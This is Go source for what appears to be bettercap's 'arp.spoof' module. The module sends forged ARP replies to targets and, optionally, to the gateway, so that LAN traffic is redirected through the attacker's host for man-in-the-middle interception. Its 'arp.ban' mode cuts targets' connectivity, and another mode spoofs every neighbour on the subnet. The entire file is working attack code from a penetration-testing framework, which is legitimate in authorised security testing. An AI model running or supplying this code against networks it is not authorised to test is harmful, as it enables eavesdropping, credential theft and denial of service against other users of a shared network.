package arp_spoof

import (
	"bytes"
	"net"
	"sync"
	"time"

	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"

	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	addresses  []net.IP
	macs       []net.HardwareAddr
	wAddresses []net.IP
	wMacs      []net.HardwareAddr
	fullDuplex bool
	internal   bool
	ban        bool
	waitGroup  *sync.WaitGroup
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		addresses:     make([]net.IP, 0),
		macs:          make([]net.HardwareAddr, 0),
		wAddresses:    make([]net.IP, 0),
		wMacs:         make([]net.HardwareAddr, 0),
		ban:           false,
		internal:      false,
		fullDuplex:    false,
		waitGroup:     &sync.WaitGroup{},
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges."))

	p.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))

	p.AddParam(session.NewBoolParameter("arp.spoof.internal",
		"false",
		"If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network."))

	p.AddParam(session.NewBoolParameter("arp.spoof.fullduplex",
		"false",
		"If true, both the targets and the gateway will be attacked, otherwise only the target (if the router has ARP spoofing protections in place this will make the attack fail)."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			p.ban = true
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@gmail.com>"
}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string
	var whitelist string

	if err, p.fullDuplex = p.BoolParam("arp.spoof.fullduplex"); err != nil {
		return err
	} else if err, p.internal = p.BoolParam("arp.spoof.internal"); err != nil {
		return err
	} else if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	} else if err, whitelist = p.StringParam("arp.spoof.whitelist"); err != nil {
		return err
	} else if p.addresses, p.macs, err = network.ParseTargets(targets, p.Session.Lan.Aliases()); err != nil {
		return err
	} else if p.wAddresses, p.wMacs, err = network.ParseTargets(whitelist, p.Session.Lan.Aliases()); err != nil {
		return err
	}

	p.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v", p.addresses, p.macs, p.wAddresses, p.wMacs)

	if p.ban {
		p.Warning("running in ban mode, forwarding not enabled!")
		p.Session.Firewall.EnableForwarding(false)
	} else if !p.Session.Firewall.IsForwardingEnabled() {
		p.Info("enabling forwarding")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if err := p.Configure(); err != nil {
		return err
	}

	return p.SetRunning(true, func() {
		neighbours := []net.IP{}
		nTargets := len(p.addresses) + len(p.macs)

		if p.internal {
			list, _ := iprange.ParseList(p.Session.Interface.CIDR())
			neighbours = list.Expand()
			nNeigh := len(neighbours) - 2

			p.Warning("arp spoofer started targeting %d possible network neighbours of %d targets.", nNeigh, nTargets)
		} else {
			p.Info("arp spoofer started, probing %d targets.", nTargets)
		}

		if p.fullDuplex {
			p.Warning("full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.")
		}

		p.waitGroup.Add(1)
		defer p.waitGroup.Done()

		gwIP := p.Session.Gateway.IP
		myMAC := p.Session.Interface.HW
		for p.Running() {
			p.arpSpoofTargets(gwIP, myMAC, true, false)
			for _, address := range neighbours {
				if !p.Session.Skip(address) {
					p.arpSpoofTargets(address, myMAC, true, false)
				}
			}

			time.Sleep(1 * time.Second)
		}
	})
}

func (p *ArpSpoofer) unSpoof() error {
	nTargets := len(p.addresses) + len(p.macs)
	p.Info("restoring ARP cache of %d targets.", nTargets)
	p.arpSpoofTargets(p.Session.Gateway.IP, p.Session.Gateway.HW, false, false)

	if p.internal {
		list, _ := iprange.ParseList(p.Session.Interface.CIDR())
		neighbours := list.Expand()
		for _, address := range neighbours {
			if !p.Session.Skip(address) {
				if realMAC, err := p.Session.FindMAC(address, false); err == nil {
					p.arpSpoofTargets(address, realMAC, false, false)
				}
			}
		}
	}

	return nil
}

func (p *ArpSpoofer) Stop() error {
	return p.SetRunning(false, func() {
		p.Info("waiting for ARP spoofer to stop ...")
		p.unSpoof()
		p.ban = false
		p.waitGroup.Wait()
	})
}

func (p *ArpSpoofer) isWhitelisted(ip string, mac net.HardwareAddr) bool {
	for _, addr := range p.wAddresses {
		if ip == addr.String() {
			return true
		}
	}

	for _, hw := range p.wMacs {
		if bytes.Equal(hw, mac) {
			return true
		}
	}

	return false
}

func (p *ArpSpoofer) getTargets(probe bool) map[string]net.HardwareAddr {
	targets := make(map[string]net.HardwareAddr)

	// add targets specified by IP address
	for _, ip := range p.addresses {
		if p.Session.Skip(ip) {
			p.Debug("skipping IP %s from arp spoofing.", ip)
			continue
		}
		// do we have this ip mac address?
		if hw, err := p.Session.FindMAC(ip, probe); err != nil {
			p.Debug("could not find hardware address for %s", ip.String())
		} else {
			targets[ip.String()] = hw
		}
	}
	// add targets specified by MAC address
	for _, hw := range p.macs {
		if ip, err := network.ArpInverseLookup(p.Session.Interface.Name(), hw.String(), false); err != nil {
			p.Warning("could not find IP address for %s", hw.String())
		} else if p.Session.Skip(net.ParseIP(ip)) {
			p.Debug("skipping address %s from arp spoofing.", ip)
		} else {
			targets[ip] = hw
		}
	}

	return targets
}

func (p *ArpSpoofer) arpSpoofTargets(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	p.waitGroup.Add(1)
	defer p.waitGroup.Done()

	gwIP := p.Session.Gateway.IP
	gwHW := p.Session.Gateway.HW
	ourHW := p.Session.Interface.HW
	isGW := false
	isSpoofing := false

	// are we spoofing the gateway IP?
	if bytes.Equal(saddr, gwIP) {
		isGW = true
		// are we restoring the original MAC of the gateway?
		if !bytes.Equal(smac, gwHW) {
			isSpoofing = true
		}
	}

	for ip, mac := range p.getTargets(probe) {
		if check_running && !p.Running() {
			return
		} else if p.isWhitelisted(ip, mac) {
			p.Debug("%s (%s) is whitelisted, skipping from spoofing loop.", ip, mac)
			continue
		} else if saddr.String() == ip {
			continue
		}

		rawIP := net.ParseIP(ip)
		if err, pkt := packets.NewARPReply(saddr, smac, rawIP, mac); err != nil {
			p.Error("error while creating ARP spoof packet for %s: %s", ip, err)
		} else {
			p.Debug("sending %d bytes of ARP packet to %s:%s.", len(pkt), ip, mac.String())
			p.Session.Queue.Send(pkt)
		}

		if p.fullDuplex && isGW {
			err := error(nil)
			gwPacket := []byte(nil)

			if isSpoofing {
				p.Debug("telling the gw we are %s", ip)
				// we told the target we're te gateway, not let's tell the
				// gateway that we are the target
				if err, gwPacket = packets.NewARPReply(rawIP, ourHW, gwIP, gwHW); err != nil {
					p.Error("error while creating ARP spoof packet: %s", err)
				}
			} else {
				p.Debug("telling the gw %s is %s", ip, mac)
				// send the gateway the original MAC of the target
				if err, gwPacket = packets.NewARPReply(rawIP, mac, gwIP, gwHW); err != nil {
					p.Error("error while creating ARP spoof packet: %s", err)
				}
			}

			if gwPacket != nil {
				if err = p.Session.Queue.Send(gwPacket); err != nil {
					p.Error("error while sending packet: %v", err)
				}
			}
		}
	}
}
